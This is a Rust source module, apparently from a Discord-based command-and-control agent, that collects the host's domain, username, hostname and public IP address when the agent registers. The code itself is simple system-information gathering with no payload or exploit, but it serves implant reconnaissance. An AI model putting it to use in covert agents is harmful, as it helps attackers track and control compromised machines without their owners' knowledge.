use crate::errors::DiscordC2Error;
use public_ip_addr::get_public_ip;
use std::{env, fs};
use std::path::Path;

/// Retrieves the user information used during agent initialization.
///
/// This function is used by the `get_or_create_agent` function in the `agent.rs` file
/// to fetch the domain and username of the current user.
///
/// # Returns
///
/// A `String` containing the user information in the format "domain:user".
#[cfg(windows)]
pub fn user() -> String {
    let domain = env::var("USERDOMAIN").unwrap_or("Unknown Hostname".to_string());
    let user = env::var("USERNAME").unwrap_or("Unknown User".to_string());

    format!("{}:{}", &domain, &user)
}

#[cfg(not(windows))]
pub fn user() -> String {
    // linux does not really have a concept of AD domains, just return the hostname
    // from /etc/hostname which usually has a FQDN
    let binding =
        fs::read_to_string(Path::new("/etc/hostname")).unwrap_or("Unknown Hostname".to_string());
    let hostname = binding.trim(); // /etc/hostname has a newline at EOF, need to trim it
    let user = env::var("USER").unwrap_or("Unknown User".parse().unwrap());

    format!("{}:{}", &hostname, &user)
}

/// Retrieves the public IP address during agent initialization.
///
/// This function is used by the `get_or_create_agent` function in the `agent.rs` file
/// to fetch the public IP address of the agent.
///
/// # Returns
///
/// The public IP address as a `String`, or an `Err` of type `DiscordC2Error` if there was an error.
pub async fn ip() -> Result<String, DiscordC2Error> {
    let ip = get_public_ip()
        .await
        .map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
    Ok(ip)
}
